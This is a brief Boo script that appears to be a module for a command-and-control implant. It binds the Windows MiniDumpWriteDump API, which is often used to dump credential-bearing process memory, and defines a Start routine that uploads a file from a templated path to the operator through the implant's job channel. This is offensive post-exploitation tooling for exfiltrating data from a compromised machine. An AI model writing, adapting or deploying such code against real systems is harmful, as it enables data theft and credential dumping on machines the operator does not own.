import System
import System.IO
import System.Diagnostics
import System.Security.Principal
import System.Runtime.InteropServices

[DllImport("Dbghelp.dll", EntryPoint:"MiniDumpWriteDump")]
def minidumpwritedump(hProcess as int, ProcessId as int, hFile as int, DumpType as int, ExceptionParam as int, UserStreamParam as int, CallbackParam as int):
    pass

public static def Start(job as duck):
    file = `FILE_PATH`
    try:
        job.Upload(file)
    except e:
        print("[-] Error during file download: " + e)
